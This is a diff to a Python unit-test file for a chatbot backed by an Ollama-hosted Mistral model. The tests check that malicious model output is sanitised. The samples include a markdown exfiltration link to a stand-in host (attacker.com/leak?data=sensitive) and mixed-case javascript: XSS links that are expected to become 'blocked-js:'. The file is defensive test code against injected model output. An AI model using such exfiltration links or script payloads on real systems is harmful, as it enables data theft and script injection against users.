@@ -51,5 +51,21 @@ class TestSecurity(unittest.TestCase):
         self.assertNotIn("![exfil]", answer)
         self.assertIn("[exfil](http://attacker.com/leak?data=sensitive)", answer)
 
+    @patch('bot.http_session.post')
+    def test_javascript_link_neutralization(self, mock_post):
+        mock_post.return_value.status_code = 200
+        # Simulated malicious LLM output trying to use javascript: for XSS
+        mock_post.return_value.json.return_value = {
+            'response': 'Click [here](javascript:alert("XSS")) or [HERE](JAVASCRIPT:alert("XSS"))'
+        }
+
+        answer = ask_mistral_ollama("safe query", "safe context")
+
+        # Verify that 'javascript:' is neutralized case-insensitively
+        # We check for the string 'javascript:' (lowercase) being absent.
+        # Since we use re.IGNORECASE, all variations should be replaced.
+        self.assertNotIn("javascript:", answer.lower())
+        self.assertIn("blocked-js:alert(\"XSS\")", answer)
+
 if __name__ == '__main__':
     unittest.main()
